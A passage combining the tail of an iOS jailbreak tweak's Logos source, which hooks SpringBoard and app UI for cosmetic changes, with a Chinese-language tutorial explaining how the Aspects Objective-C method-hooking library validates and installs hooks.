        return %orig(arg1);
    }

    if (blockerPropagatedEvent && arg1 != 17) {
        return %orig(arg1);
    }

    if (arg1 == 0 && !self.blocksTouches) {
        %orig(0);
        return;
    }

    if (self.blocksTouches) {
        arg1_overwrite = 17;
    } else if (arg1 == 17) {
        // THIS IS THE ONLY BLOCK YOU CAN CHANGE
        arg1_overwrite = 5;
        // Todo: detect when, in this case, the app is being pulled up from the bottom, and activate the rounded corners.
    }

    UIView* _overlayClippingView = MSHookIvar<UIView*>(self, "_overlayClippingView");
    if (!_overlayClippingView.layer.allowsEdgeAntialiasing) {
        _overlayClippingView.layer.allowsEdgeAntialiasing = true;
    }

    %orig(arg1_overwrite);
}

- (void)_updateCornerRadius {
    /// CAREFUL HERE, WATCH OUT FOR THE ICON MORPH ANIMATION ON APPLICATION LAUNCH
    if ((self.cornerRadius == 5 && currentCachedCornerRadius == 17.0)) {
        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.35 dampingRatio:1 animations:^{
            %orig;
        }];
        [animator startAnimation];
    } else {
        %orig;
    }
}
%end

// Override Reachability corner radius.
%hook SBReachabilityBackgroundView
- (double)_displayCornerRadius {
    return 5;
}
%end


// MARK: Reachability settings override
%hook SBReachabilitySettings
- (void)setSystemWideSwipeDownHeight:(double) systemWideSwipeDownHeight {
    return %orig(100);
}
%end

// High Resolution Wallpaper
@interface SBFStaticWallpaperImageView : UIImageView
@end

%hook SBFStaticWallpaperImageView
- (void)setImage:(id)arg1 {

    if (!prototypingEnabled) {
        return %orig;
    }

    NSBundle *bundle = [[NSBundle alloc] initWithPath:kBundlePath];
    NSString *imagePath = [bundle pathForResource:@"DoubleBubble_Red" ofType:@"png"];
    UIImage *myImage = [UIImage imageWithContentsOfFile:imagePath];

    UIImage *originalDownscaledImage = arg1;

    if (originalDownscaledImage.size.width == 375) {
        return %orig(myImage);
    }

    return %orig(arg1);
}
%end

%end


%group KeyboardDock

%hook UIRemoteKeyboardWindowHosted
- (UIEdgeInsets)safeAreaInsets {
    UIEdgeInsets orig = %orig;
    orig.bottom = 44;
    return orig;
}
%end

%hook UIKeyboardImpl
+(UIEdgeInsets)deviceSpecificPaddingForInterfaceOrientation:(NSInteger)orientation inputMode:(id)mode {
    UIEdgeInsets orig = %orig;
    orig.bottom = 44;
    return orig;
}

%end

@interface UIKeyboardDockView : UIView
@end

%hook UIKeyboardDockView

- (CGRect)bounds {
    CGRect bounds = %orig;
    if (bounds.origin.y == 0) {
        bounds.origin.y -=13;
    }
    return bounds;
}

- (void)layoutSubviews {
    %orig;
}

%end

%hook UIInputWindowController
- (UIEdgeInsets)_viewSafeAreaInsetsFromScene {
    return UIEdgeInsetsMake(0,0,44,0);
}
%end

%end

int _controlCenterStatusBarInset = -10;

// MARK: - Group: Springboard modifications (Control Center Status Bar inset)
%group ControlCenterModificationsStatusBar

@interface CCUIHeaderPocketView : UIView
@end

%hook CCUIHeaderPocketView
- (void)layoutSubviews {
    %orig;

    CGRect _frame = self.frame;
    _frame.origin.y = _controlCenterStatusBarInset;
    self.frame = _frame;
}
%end

%end

%group StatusBarProvider

// MARK: - Variable modern status bar implementation

%hook _UIStatusBarVisualProvider_iOS
+ (Class)class {
    if (statusBarStyle == 0) {
        return NSClassFromString(@"_UIStatusBarVisualProvider_Split58");
    } else if (@available(iOS 12.1, *)) {
        return NSClassFromString(@"_UIStatusBarVisualProvider_RoundedPad_ForcedCellular");
    }
    return NSClassFromString(@"_UIStatusBarVisualProvider_Pad_ForcedCellular");
}
%end

%hook _UIStatusBar
+ (double)heightForOrientation:(long long)arg1 {
    if (arg1 == 1 || arg1 == 2) {
        if (statusBarStyle == 0) {
            return %orig - 10;
        } else if (statusBarStyle == 1) {
            return %orig - 4;
        }
    }
    return %orig;
}
%end

%end


%group StatusBarModern

%hook UIStatusBarWindow
+ (void)setStatusBar:(Class)arg1 {
    return %orig(NSClassFromString(@"UIStatusBar_Modern"));
}
%end

%hook UIStatusBar_Base
+ (Class)_implementationClass {
    return NSClassFromString(@"UIStatusBar_Modern");
}
+ (void)_setImplementationClass:(Class)arg1 {
    return %orig(NSClassFromString(@"UIStatusBar_Modern"));
}
%end

%hook _UIStatusBarData
- (void)setBackNavigationEntry:(id)arg1 {
    return;
}
%end

%end


float _bottomInset = 21;

%group TabBarSizing

// MARK: - Inset behavior modifications
%hook UITabBar

- (void)layoutSubviews {
    %orig;
    CGRect _frame = self.frame;
    if (_frame.size.height == 49) {
        _frame.size.height = 70;
        _frame.origin.y = [[UIScreen mainScreen] bounds].size.height - 70;
    }
    self.frame = _frame;
}

%end

%hook UIApplicationSceneSettings

- (UIEdgeInsets)safeAreaInsetsLandscapeLeft {
    UIEdgeInsets _insets = %orig;
    _insets.bottom = _bottomInset;
    return _insets;
}
- (UIEdgeInsets)safeAreaInsetsLandscapeRight {
    UIEdgeInsets _insets = %orig;
    _insets.bottom = _bottomInset;
    return _insets;
}
- (UIEdgeInsets)safeAreaInsetsPortrait {
    UIEdgeInsets _insets = %orig;
    _insets.bottom = _bottomInset;
    return _insets;
}
- (UIEdgeInsets)safeAreaInsetsPortraitUpsideDown {
    UIEdgeInsets _insets = %orig;
    _insets.bottom = _bottomInset;
    return _insets;
}

%end

%end

// MARK: - Toolbar resizing implementation
%group ToolbarSizing
/*
 @interface UIToolbar (modification)
 @property (setter=_setBackgroundView:, nonatomic, retain) UIView *_backgroundView;
 @end

 %hook UIToolbar

 - (void)layoutSubviews {
 %orig;
 CGRect _frame = self.frame;
 if (_frame.size.height == 44) {
 _frame.origin.y = [[UIScreen mainScreen] bounds].size.height - 54;
 }
 self.frame = _frame;

 _frame = self._backgroundView.frame;
 _frame.size.height = 54;
 self._backgroundView.frame = _frame;
 }

 %end
 */
%end

%group HideLuma

// Hide Home Indicator
%hook UIViewController
- (BOOL)prefersHomeIndicatorAutoHidden {
    return YES;
}
%end

%end

%group CompletelyHideLuma

// Hide HomeBar
@interface MTLumaDodgePillView : UIView
@end

%hook MTLumaDodgePillView
- (id)initWithFrame:(struct CGRect)arg1 {
      return NULL;
}
%end

%end

// MARK: - Shortcuts
%group Shortcuts

@interface WFFloatingLayer : CALayer
@end

%hook WFFloatingLayer
-(BOOL)continuousCorners {
    return YES;
}
%end

%end

// MARK: - Twitter
%group Twitter

@interface TFNCustomTabBar : UIView
@end

%hook TFNCustomTabBar

- (void)layoutSubviews {
    %orig;
    CGRect _frame = self.frame;
    if (_frame.origin.y != [[UIScreen mainScreen] bounds].size.height - _frame.size.height) {
        _frame.origin.y -= 3.5;
    }
    self.frame = _frame;
}

%end

%end

// MARK: - Calendar
%group Calendar

@interface CompactMonthDividedListSwitchButton : UIView
@end

%hook CompactMonthDividedListSwitchButton
- (void)layoutSubviews {
    %orig;

    self.layer.cornerRadius = 3;
    self.layer.continuousCorners = YES;
    self.clipsToBounds = YES;
}
%end;

%end

// MARK: - Picture in Picture
%group PIPOverride

// Override MobileGestalt to always return true for PIP key - Acknowledgements: Andrew Wiik (LittleX)
extern "C" Boolean MGGetBoolAnswer(CFStringRef);
%hookf(Boolean, MGGetBoolAnswer, CFStringRef key) {
#define k(key_) CFEqual(key, CFSTR(key_))
    if (k("nVh/gwNpy7Jv1NOk00CMrw"))
        return YES;
    return %orig;
}

%end

@interface _UITableViewCellSeparatorView : UIView
- (id)_viewControllerForAncestor;
@end

@interface UITableViewHeaderFooterView (WalletAdditions)
- (id)_viewControllerForAncestor;
@end

@interface UITableViewCell (WalletAdditions)
- (id)_viewControllerForAncestor;
@end

@interface UISegmentedControl (WalletAdditions)
@property (nonatomic, retain) UIColor *tintColor;
- (id)_viewControllerForAncestor;
@end

@interface UITextView (WalletAdditions)
- (id)_viewControllerForAncestor;
@end

@interface PKContinuousButton : UIView
@end



%group NEPThemeEngine

@interface SBApplicationIcon : NSObject
@end

%hook SBApplicationIcon
- (id)getCachedIconImage:(int)arg1 {

    NSString *_applicationBundleID = MSHookIvar<NSString*>(self, "_applicationBundleID");

    if (/*[_applicationBundleID isEqualToString:@"com.atebits.Tweetie2"] || */[_applicationBundleID isEqualToString:@"com.apple.news"]) {

        NSBundle *bundle = [[NSBundle alloc] initWithPath:kBundlePath];
        NSString *imagePath = [bundle pathForResource:_applicationBundleID ofType:@"png"];
        UIImage *myImage = [UIImage imageWithContentsOfFile:imagePath];

        return myImage;
    }
    return %orig;
}
- (id)getUnmaskedIconImage:(int)arg1 {

    NSString *_applicationBundleID = MSHookIvar<NSString*>(self, "_applicationBundleID");

    if (/*[_applicationBundleID isEqualToString:@"com.atebits.Tweetie2"] || */[_applicationBundleID isEqualToString:@"com.apple.news"]) {

        NSBundle *bundle = [[NSBundle alloc] initWithPath:kBundlePath];
        NSString *imagePath = [bundle pathForResource:[NSString stringWithFormat:@"%@_unmasked", _applicationBundleID] ofType:@"png"];
        UIImage *myImage = [UIImage imageWithContentsOfFile:imagePath];

        return myImage;
    }
    return %orig;
}
- (id)generateIconImage:(int)arg1 {

    NSString *_applicationBundleID = MSHookIvar<NSString*>(self, "_applicationBundleID");

    if (/*[_applicationBundleID isEqualToString:@"com.atebits.Tweetie2"] || */[_applicationBundleID isEqualToString:@"com.apple.news"]) {

        NSBundle *bundle = [[NSBundle alloc] initWithPath:kBundlePath];
        NSString *imagePath = [bundle pathForResource:_applicationBundleID ofType:@"png"];
        UIImage *myImage = [UIImage imageWithContentsOfFile:imagePath];

        return myImage;
    }
    return %orig;
}
%end

%end

// MARK: - Wallet
%group Wallet122UI

%hook _UITableViewCellSeparatorView
- (void)layoutSubviews {
    if ([[NSString stringWithFormat:@"%@", self._viewControllerForAncestor] containsString:@"PassDetailViewController"] || [[NSString stringWithFormat:@"%@", self._viewControllerForAncestor] containsString:@"PKPaymentPreferencesViewController"]) {
        if (self.frame.origin.x == 0) {
            self.hidden = YES;
        }
    }
}
%end

%hook UISegmentedControl
- (void)layoutSubviews {
    %orig;
    if ([[NSString stringWithFormat:@"%@", self._viewControllerForAncestor] containsString:@"PassDetailViewController"]) {
        self.tintColor = [UIColor blackColor];
    }
}
%end

%hook UITextView
- (void)layoutSubviews {
    %orig;
    CGRect _frame = self.frame;
    if ([[NSString stringWithFormat:@"%@", self._viewControllerForAncestor] containsString:@"PKBarcodePassDetailViewController"] && _frame.origin.x == 16) {
        _frame.origin.x += 10;
        self.frame = _frame;
    }
}
%end



%hook PKContinuousButton
- (void)updateTitleColorWithColor:(id)arg1 {
    //if (self.frame.size.width < 90) {
    //%orig([UIColor blackColor]);
    //} else {
    %orig;
    //}
}
%end

%hook UITableViewCell
- (void)layoutSubviews {
    %orig;
    if ([[NSString stringWithFormat:@"%@", self._viewControllerForAncestor] containsString:@"PassDetailViewController"] || [[NSString stringWithFormat:@"%@", self._viewControllerForAncestor] containsString:@"PKPaymentPreferencesViewController"]) {
        CGRect _frame = self.frame;
        if (_frame.origin.x == 0) {

            self.layer.cornerRadius = 10;
            self.clipsToBounds = YES;

            typedef enum {
                Lone=0,
                Bottom=1,
                Top=2,
                Middle=3
            } NEPCellPosition;

            NEPCellPosition _cellPosition = Middle;

            for (UIView *subview in self.subviews) {
                if ([[NSString stringWithFormat:@"%@", subview] containsString:@"_UITableViewCellSeparatorView"] && subview.frame.origin.x == 0 && subview.frame.origin.y == 0 && subview.frame.size.height == 0.5) {
                    _cellPosition = Top;
                }
            }

            for (UIView *subview in self.subviews) {
                if ([[NSString stringWithFormat:@"%@", subview] containsString:@"_UITableViewCellSeparatorView"] && subview.frame.origin.x == 0 && subview.frame.origin.y > 0 && subview.frame.size.height == 0.5) {
                    if (_cellPosition == Top) {
                        _cellPosition = Lone;
                    } else {
                        _cellPosition = Bottom;
                    }
                }
            }

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wunguarded-availability"
            if (_cellPosition == Top) {
                self.layer.maskedCorners = kCALayerMinXMinYCorner | kCALayerMaxXMinYCorner;
            } else if (_cellPosition == Bottom) {
                self.layer.maskedCorners = kCALayerMinXMaxYCorner | kCALayerMaxXMaxYCorner;
            } else if (_cellPosition == Middle) {
                self.layer.cornerRadius = 0;
                self.clipsToBounds = NO;
            }
#pragma clang diagnostic pop

            _frame.size.width -= 32;
            _frame.origin.x = 16;
            self.frame = _frame;
        }
    }
}
%end

%hook UITableViewHeaderFooterView
- (void)layoutSubviews {
    if ([[NSString stringWithFormat:@"%@", self._viewControllerForAncestor] containsString:@"PassDetailViewController"]) {
        if (self.frame.origin.x == 0) {
            CGRect _frame = self.frame;
            //if (_frame.size.width > 200) {
            _frame.size.width -= 10;
            //}
            _frame.origin.x += 5;
            self.frame = _frame;
        }
    }
    %orig;
}
%end

%end

%group Maps

@interface MapsProgressButton : UIView
@end

%hook MapsProgressButton
- (void)layoutSubviews {
    %orig;
    self.layer.continuousCorners = true;
}
%end

%end

%group Castro

@interface SUPTabsCardViewController : UIViewController
@end

%hook SUPTabsCardViewController
- (void)viewDidLoad {
    %orig;
    self.view.layer.mask = NULL;
    self.view.layer.continuousCorners = YES;
    self.view.layer.masksToBounds = YES;
    self.view.layer.cornerRadius = 10;
}
%end

@interface SUPDimExternalImageViewButton : UIView
- (void)setHighlighted:(bool)arg1;
@end

%hook SUPDimExternalImageViewButton
- (void)setHighlighted:(bool)arg1 {
    if (arg1 == YES) {

        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.1 curve:UIViewAnimationCurveEaseOut animations:^{
            %orig;
        }];
        [animator startAnimation];
    } else {
        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.4 dampingRatio:1 animations:^{
            %orig;
        }];
        [animator startAnimation];
    }
    return;
}
%end

%end

%ctor {

    NSString *bundleIdentifier = [NSBundle mainBundle].bundleIdentifier;

    // Gather current preference keys.
    NSString *settingsPath = @"/var/mobile/Library/Preferences/com.duraidabdul.neptune.plist";

    NSFileManager *fileManager = [NSFileManager defaultManager];

    NSMutableDictionary *currentSettings;

    BOOL shouldReadAndWriteDefaults = false;

    if ([fileManager fileExistsAtPath:settingsPath]){
        currentSettings = [[NSMutableDictionary alloc] initWithContentsOfFile:settingsPath];
        if ([[currentSettings objectForKey:@"preferencesVersionID"] intValue] != 100) {
          shouldReadAndWriteDefaults = true;
        }
    } else {
      shouldReadAndWriteDefaults = true;
    }

    if (shouldReadAndWriteDefaults) {
      NSBundle *bundle = [[NSBundle alloc] initWithPath:kBundlePath];
      NSString *defaultsPath = [bundle pathForResource:@"defaults" ofType:@"plist"];
      currentSettings = [[NSMutableDictionary alloc] initWithContentsOfFile:defaultsPath];

      [currentSettings writeToFile: settingsPath atomically:YES];
    }

    isFluidInterfaceEnabled = [[currentSettings objectForKey:@"isFluidInterfaceEnabled"] boolValue];
    isHomeIndicatorEnabled = [[currentSettings objectForKey:@"isHomeIndicatorEnabled"] boolValue];
    isButtonCombinationOverrideDisabled = [[currentSettings objectForKey:@"isButtonCombinationOverrideDisabled"] boolValue];
    isTallKeyboardEnabled = [[currentSettings objectForKey:@"isTallKeyboardEnabled"] boolValue];
    isPIPEnabled = [[currentSettings objectForKey:@"isPIPEnabled"] boolValue];
    statusBarStyle = [[currentSettings objectForKey:@"statusBarStyle"] intValue];
    isWalletEnabled = [[currentSettings objectForKey:@"isWalletEnabled"] boolValue];
    isNewsIconEnabled = [[currentSettings objectForKey:@"isNewsIconEnabled"] boolValue];
    prototypingEnabled = [[currentSettings objectForKey:@"prototypingEnabled"] boolValue];



    // Conditional status bar initialization
    NSArray *acceptedStatusBarIdentifiers = @[@"com.apple",
                                              @"com.culturedcode.ThingsiPhone",
                                              @"com.christianselig.Apollo",
                                              @"co.supertop.Castro-2",
                                              @"com.facebook.Messenger",
                                              @"com.saurik.Cydia",
                                              @"is.workflow.my.app"
                                              ];

    %init(StatusBarProvider);

    for (NSString *identifier in acceptedStatusBarIdentifiers) {
        if ((statusBarStyle == 0 && [bundleIdentifier containsString:identifier]) || statusBarStyle == 1) {
            %init(StatusBarModern);
        }
    }

    // Conditional inset adjustment initialization
    NSArray *acceptedInsetAdjustmentIdentifiers = @[@"com.apple",
                                                    @"com.culturedcode.ThingsiPhone",
                                                    @"com.christianselig.Apollo",
                                                    @"co.supertop.Castro-2",
                                                    @"com.chromanoir.Zeit",
                                                    @"com.chromanoir.spectre",
                                                    @"com.saurik.Cydia",
                                                    @"is.workflow.my.app"
                                                    ];
    NSArray *acceptedInsetAdjustmentIdentifiers_NoTabBarLabels = @[@"com.facebook.Facebook",
                                                                   @"com.facebook.Messenger",
                                                                   @"com.burbn.instagram",
                                                                   @"com.medium.reader",
                                                                   @"com.pcalc.mobile"
                                                                   ];

    BOOL isInsetAdjustmentEnabled = false;

    if (![bundleIdentifier containsString:@"mobilesafari"]) {
        for (NSString *identifier in acceptedInsetAdjustmentIdentifiers) {
            if ([bundleIdentifier containsString:identifier]) {
                isInsetAdjustmentEnabled = true;
                break;
            }
        }
        if (!isInsetAdjustmentEnabled) {
            for (NSString *identifier in acceptedInsetAdjustmentIdentifiers_NoTabBarLabels) {
                if ([bundleIdentifier containsString:identifier]) {
                    _bottomInset = 16;
                    isInsetAdjustmentEnabled = true;
                }
            }
        }
    }

    if (isHomeIndicatorEnabled && isFluidInterfaceEnabled) {
      if (isInsetAdjustmentEnabled) {
          %init(TabBarSizing);
          %init(ToolbarSizing);
      } else {
          %init(HideLuma);
      }
    } else {
      %init(CompletelyHideLuma);
    }

    // SpringBoard
    if ([bundleIdentifier isEqualToString:@"com.apple.springboard"]) {
        if (statusBarStyle != 0) {
            _statusBarHeightStyle = Regular;
            _controlCenterStatusBarInset = -24;
        }
        if (isFluidInterfaceEnabled) {
          %init(FluidInterface)
          %init(ButtonRemap)
        }

        %init(ControlCenter122UI)
        if (isFluidInterfaceEnabled) {
          %init(ControlCenterModificationsStatusBar)
        }
        %init(SBButtonRefinements)
    }

    // Wallet
    if ([bundleIdentifier containsString:@"Passbook"] && isWalletEnabled) {
        %init(Wallet122UI);
    }

    // Shortcuts
    if ([bundleIdentifier containsString:@"workflow"]) {
        %init(Shortcuts);
    }

    // Calendar
    if ([bundleIdentifier containsString:@"com.apple.mobilecal"]) {
        %init(Calendar);
    }

    // Maps
    if ([bundleIdentifier containsString:@"com.apple.Maps"]) {
        %init(Maps);
    }

    // Twitter
    if ([bundleIdentifier containsString:@"com.atebits.Tweetie2"] && prototypingEnabled) {
        %init(Twitter);
    }

    if ([bundleIdentifier containsString:@"supertop"]) {
        %init(Castro);
    }

    // Picture in picture
    if (isPIPEnabled) {
        %init(PIPOverride);
    }

    if (isNewsIconEnabled && [bundleIdentifier containsString:@"com.apple.springboard"]) {
        %init(NEPThemeEngine);
    }

    // Keyboard height adjustment
    if (isTallKeyboardEnabled) {
        %init(KeyboardDock);
    }

    // Any ungrouped hooks
    %init(_ungrouped);
}

```

#  Aspects Hook是什么?
Aspects是一个开源的的库,面向切面编程,它能允许你在每一个类和每一个实例中存在的方法里面加入任何代码。可以在方法执行之前或者之后执行,也可以替换掉原有的方法。通过Runtime消息转发实现Hook。Aspects会自动处理超类,比常规方法调用更容易使用,github上Star已经超过6000多,已经比较稳定了;

先从源码入手,最后再进行总结,如果对源码不感兴趣的可以直接跳到文章末尾去查看具体流程

二:Aspects是Hook前的准备工作
+ (id<AspectToken>)aspect_hookSelector:(SEL)selector
                      withOptions:(AspectOptions)options
                       usingBlock:(id)block
                            error:(NSError **)error {
    return aspect_add((id)self, selector, options, block, error);
}
- (id<AspectToken>)aspect_hookSelector:(SEL)selector
                      withOptions:(AspectOptions)options
                       usingBlock:(id)block
                            error:(NSError **)error {
    return aspect_add(self, selector, options, block, error);
}
通过上面的方法添加Hook,传入SEL(要Hook的方法), options(远方法调用调用之前或之后调用或者是替换),block(要执行的代码),error(错误信息)

static id aspect_add(id self, SEL selector, AspectOptions options, id block, NSError **error) {
    NSCParameterAssert(self);
    NSCParameterAssert(selector);
    NSCParameterAssert(block);

    __block AspectIdentifier *identifier = nil;
    aspect_performLocked(^{
        //先判断参数的合法性,如果不合法直接返回nil
        if (aspect_isSelectorAllowedAndTrack(self, selector, options, error)) {
            //参数合法
            //创建容器
            AspectsContainer *aspectContainer = aspect_getContainerForObject(self, selector);
            //创建一个AspectIdentifier对象(保存hook内容)
            identifier = [AspectIdentifier identifierWithSelector:selector object:self options:options block:block error:error];
            if (identifier) {
                //把identifier添加到容器中(根据options,添加到不同集合中)
                [aspectContainer addAspect:identifier withOptions:options];

                // Modify the class to allow message interception.
                aspect_prepareClassAndHookSelector(self, selector, error);
            }
        }
    });
    return identifier;
}
上面的方法主要是分为以下几步:

判断上面传入的方法的合法性
如果合法就创建AspectsContainer容器类,这个容器会根据传入的切片时机进行分类,添加到对应的集合中去
创建AspectIdentifier对象保存hook内容
如果AspectIdentifier对象创建成功,就把AspectIdentifier根据options添加到对应的数组中
最终调用aspect_prepareClassAndHookSelector(self, selector, error);开始进行hook
接下来就对上面的步骤一一解读

一:判断传入方法的合法性
/*
 判断参数的合法性:
 1.先将retain,release,autorelease,forwardInvocation添加到数组中,如果SEL是数组中的某一个,报错
并返回NO,这几个全是不能进行Swizzle的方法
 2.传入的时机是否正确,判断SEL是否是dealloc,如果是dealloc,选择的调用时机必须是AspectPositionBefore
 3.判断类或者类对象是否响应传入的sel
 4.如果替换的是类方法,则进行是否重复替换的检查
 */
static BOOL aspect_isSelectorAllowedAndTrack(NSObject *self, SEL selector, AspectOptions options, NSError **error) {
    static NSSet *disallowedSelectorList;
    static dispatch_once_t pred;
    dispatch_once(&pred, ^{
        disallowedSelectorList = [NSSet setWithObjects:@"retain", @"release", @"autorelease", @"forwardInvocation:", nil];
    });

    // Check against the blacklist.
    NSString *selectorName = NSStringFromSelector(selector);
    if ([disallowedSelectorList containsObject:selectorName]) {
        NSString *errorDescription = [NSString stringWithFormat:@"Selector %@ is blacklisted.", selectorName];
        AspectError(AspectErrorSelectorBlacklisted, errorDescription);
        return NO;
    }

    // Additional checks.
    AspectOptions position = options&AspectPositionFilter;
    //如果是dealloc必须是AspectPositionBefore,不然报错
    if ([selectorName isEqualToString:@"dealloc"] && position != AspectPositionBefore) {
        NSString *errorDesc = @"AspectPositionBefore is the only valid position when hooking dealloc.";
        AspectError(AspectErrorSelectorDeallocPosition, errorDesc);
        return NO;
    }
    //判断是否可以响应方法,respondsToSelector(判断对象是否响应某个方法),instancesRespondToSelector(判断类能否响应某个方法)
    if (![self respondsToSelector:selector] && ![self.class instancesRespondToSelector:selector]) {
        NSString *errorDesc = [NSString stringWithFormat:@"Unable to find selector -[%@ %@].", NSStringFromClass(self.class), selectorName];
        AspectError(AspectErrorDoesNotRespondToSelector, errorDesc);
        return NO;
    }

    // Search for the current class and the class hierarchy IF we are modifying a class object
    //判断是不是元类,
    if (class_isMetaClass(object_getClass(self))) {
        Class klass = [self class];
        //创建字典
        NSMutableDictionary *swizzledClassesDict = aspect_getSwizzledClassesDict();
        Class currentClass = [self class];
        do {
            AspectTracker *tracker = swizzledClassesDict[currentClass];
            if ([tracker.selectorNames containsObject:selectorName]) {

                // Find the topmost class for the log.
                if (tracker.parentEntry) {
                    AspectTracker *topmostEntry = tracker.parentEntry;
                    while (topmostEntry.parentEntry) {
                        topmostEntry = topmostEntry.parentEntry;
                    }
                    NSString *errorDescription = [NSString stringWithFormat:@"Error: %@ already hooked in %@. A method can only be hooked once per class hierarchy.", selectorName, NSStringFromClass(topmostEntry.trackedClass)];
                    AspectError(AspectErrorSelectorAlreadyHookedInClassHierarchy, errorDescription);
                    return NO;
                }else if (klass == currentClass) {
                    // Already modified and topmost!
                    return YES;
                }
            }
        }while ((currentClass = class_getSuperclass(currentClass)));

        // Add the selector as being modified.
//到此就表示传入的参数合法,并且没有被hook过,就可以把信息保存起来了
        currentClass = klass;
        AspectTracker *parentTracker = nil;
        do {
            AspectTracker *tracker = swizzledClassesDict[currentClass];
            if (!tracker) {
                tracker = [[AspectTracker alloc] initWithTrackedClass:currentClass parent:parentTracker];
                swizzledClassesDict[(id<NSCopying>)currentClass] = tracker;
            }
            [tracker.selectorNames addObject:selectorName];
            // All superclasses get marked as having a subclass that is modified.
            parentTracker = tracker;
        }while ((currentClass = class_getSuperclass(currentClass)));
    }

    return YES;
}
上面代码主要干了一下几件事:

把"retain", "release", "autorelease", "forwardInvocation:这几个加入集合中,判断集合中是否包含传入的selector,如果包含返回NO,这也说明Aspects不能对这几个函数进行hook操作;
判断selector是不是dealloc方法,如果是切面时机必须是AspectPositionBefore,要不然就会报错并返回NO,dealloc之后对象就销毁,所以切片时机只能是在原方法调用之前调用
判断类和实例对象是否可以响应传入的selector,不能就返回NO
判断是不是元类,如果是元类,判断方法有没有被hook过,如果没有就保存数据,一个方法在一个类的层级里面只能hook一次
2.创建AspectsContainer容器类
// Loads or creates the aspect container.
static AspectsContainer *aspect_getContainerForObject(NSObject *self, SEL selector) {
    NSCParameterAssert(self);
    //拼接字符串aspects__viewDidAppear:
    SEL aliasSelector = aspect_aliasForSelector(selector);
    //获取aspectContainer对象
    AspectsContainer *aspectContainer = objc_getAssociatedObject(self, aliasSelector);
    //如果上面没有获取到就创建
    if (!aspectContainer) {
        aspectContainer = [AspectsContainer new];
        objc_setAssociatedObject(self, aliasSelector, aspectContainer, OBJC_ASSOCIATION_RETAIN);
    }
    return aspectContainer;
}
获得其对应的AssociatedObject关联对象，如果获取不到，就创建一个关联对象。最终得到selector有"aspects_"前缀，对应的aspectContainer。

3.创建AspectIdentifier对象保存hook内容
+ (instancetype)identifierWithSelector:(SEL)selector object:(id)object options:(AspectOptions)options block:(id)block error:(NSError **)error {
    NSCParameterAssert(block);
    NSCParameterAssert(selector);
//    /把blcok转换成方法签名
    NSMethodSignature *blockSignature = aspect_blockMethodSignature(block, error); // TODO: check signature compatibility, etc.
    //aspect_isCompatibleBlockSignature 对比要替换方法的block和原方法,如果不一样,不继续进行
    //如果一样,把所有的参数赋值给AspectIdentifier对象
    if (!aspect_isCompatibleBlockSignature(blockSignature, object, selector, error)) {
        return nil;
    }

    AspectIdentifier *identifier = nil;
    
    if (blockSignature) {
        identifier = [AspectIdentifier new];
        identifier.selector = selector;
        identifier.block = block;
        identifier.blockSignature = blockSignature;
        identifier.options = options;
        identifier.object = object; // weak
    }
    return identifier;
}
/*
 1.把原方法转换成方法签名
 2.然后比较两个方法签名的参数数量,如果不相等,说明不一样
 3.如果参数个数相同,再比较blockSignature的第一个参数
 */
static BOOL aspect_isCompatibleBlockSignature(NSMethodSignature *blockSignature, id object, SEL selector, NSError **error) {
    NSCParameterAssert(blockSignature);
    NSCParameterAssert(object);
    NSCParameterAssert(selector);

    BOOL signaturesMatch = YES;
    //把原方法转化成方法签名
    NSMethodSignature *methodSignature = [[object class] instanceMethodSignatureForSelector:selector];
    //判断两个方法编号的参数数量
    if (blockSignature.numberOfArguments > methodSignature.numberOfArguments) {
        signaturesMatch = NO;
    }else {
        //取出blockSignature的第一个参数是不是_cmd,对应的type就是'@',如果不等于'@',也不匹配
        if (blockSignature.numberOfArguments > 1) {
            const char *blockType = [blockSignature getArgumentTypeAtIndex:1];
            if (blockType[0] != '@') {
                signaturesMatch = NO;
            }
        }
        // Argument 0 is self/block, argument 1 is SEL or id<AspectInfo>. We start comparing at argument 2.
        // The block can have less arguments than the method, that's ok.
        //如果signaturesMatch = yes,下面才是比较严格的比较
        if (signaturesMatch) {
            for (NSUInteger idx = 2; idx < blockSignature.numberOfArguments; idx++) {
                const char *methodType = [methodSignature getArgumentTypeAtIndex:idx];
                const char *blockType = [blockSignature getArgumentTypeAtIndex:idx];
                // Only compare parameter, not the optional type data.
                if (!methodType || !blockType || methodType[0] != blockType[0]) {
                    signaturesMatch = NO; break;
                }
            }
        }
    }
    //如果经过上面的对比signaturesMatch都为NO,抛出异常
    if (!signaturesMatch) {
        NSString *description = [NSString stringWithFormat:@"Blog signature %@ doesn't match %@.", blockSignature, methodSignature];
        AspectError(AspectErrorIncompatibleBlockSignature, description);
        return NO;
    }
    return YES;
}
//把blcok转换成方法签名
#pragma mark 把blcok转换成方法签名
static NSMethodSignature *aspect_blockMethodSignature(id block, NSError **error) {
    AspectBlockRef layout = (__bridge void *)block;
    //判断是否有AspectBlockFlagsHasSignature标志位,没有报不包含方法签名的error
    if (!(layout->flags & AspectBlockFlagsHasSignature)) {
        NSString *description = [NSString stringWithFormat:@"The block %@ doesn't contain a type signature.", block];
        AspectError(AspectErrorMissingBlockSignature, description);
        return nil;
    }
    void *desc = layout->descriptor;
    desc += 2 * sizeof(unsigned long int);
    if (layout->flags & AspectBlockFlagsHasCopyDisposeHelpers) {
        desc += 2 * sizeof(void *);
    }
    if (!desc) {
        NSString *description = [NSString stringWithFormat:@"The block %@ doesn't has a type signature.", block];
        AspectError(AspectErrorMissingBlockSignature, description);
        return nil;
    }
    const char *signature = (*(const char **)desc);
    return [NSMethodSignature signatureWithObjCTypes:signature];
}
这个方法先把block转换成方法签名,然后和原来的方法签名进行对比,如果不一样返回NO,一样就进行赋值操作

4.把AspectIdentifier根据options添加到对应的数组中
- (void)addAspect:(AspectIdentifier *)aspect withOptions:(AspectOptions)options {
    NSParameterAssert(aspect);
    NSUInteger position = options&AspectPositionFilter;
    switch (position) {
        case AspectPositionBefore:  self.beforeAspects  = [(self.beforeAspects ?:@[]) arrayByAddingObject:aspect]; break;
        case AspectPositionInstead: self.insteadAspects = [(self.insteadAspects?:@[]) arrayByAddingObject:aspect]; break;
        case AspectPositionAfter:   self.afterAspects   = [(self.afterAspects  ?:@[]) arrayByAddingObject:aspect]; break;
    }
}
根据传入的切面时机,进行对应数组的存储;

5.开始进行hook
aspect_prepareClassAndHookSelector(self, selector, error);
